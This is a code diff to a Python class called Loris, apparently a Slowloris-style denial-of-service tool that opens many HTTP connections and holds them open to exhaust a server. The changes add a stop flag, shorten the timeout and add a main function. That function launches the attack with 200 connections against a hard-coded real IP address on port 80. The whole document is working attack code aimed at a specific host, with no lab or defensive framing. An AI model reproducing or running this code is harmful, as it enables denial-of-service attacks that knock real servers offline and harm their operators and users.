@@ -14,16 +14,18 @@ class Loris:
         self.addr = addr
         self.port = port
         self.totalConnections = totalConnections
+        self.end = False
 
         self.threadList = []
         self.connectionsPerThread = 10
-        self.MAX_TIMEOUT = 300
+        self.MAX_TIMEOUT = 30
 
     """
     Begin an attack against the specified host on the specified
     port
     """
     def initiateAttack(self):
+    	self.end = False
         self.timeout = self.findTimeout()
         if self.timeout < 0:
             print "Something is going horribly wrong"
@@ -42,8 +44,7 @@ class Loris:
     Call this to cancel the attack and free all connections
     """
     def endAttack(self):
-        for t in self.threadList:
-            t.kill()
+        self.end = True
 
     """
     Determine the timeout to be used from this host to the
@@ -81,8 +82,8 @@ class Loris:
         sockets = [None]  * self.connectionsPerThread
 
         while (True):
-#            if self.killed():
-#                return
+            if self.end:
+            	return
 
             """ Establish connections """
             for i in range(0, self.connectionsPerThread):
@@ -122,3 +123,10 @@ class Loris:
 
             """ Sleep for timeout """
             time.sleep(self.timeout)
+
+def main():
+    loris = Loris(addr = "107.150.39.234", port = 80, totalConnections = 200)
+    loris.initiateAttack()
+
+if __name__ == "__main__":
+    main()
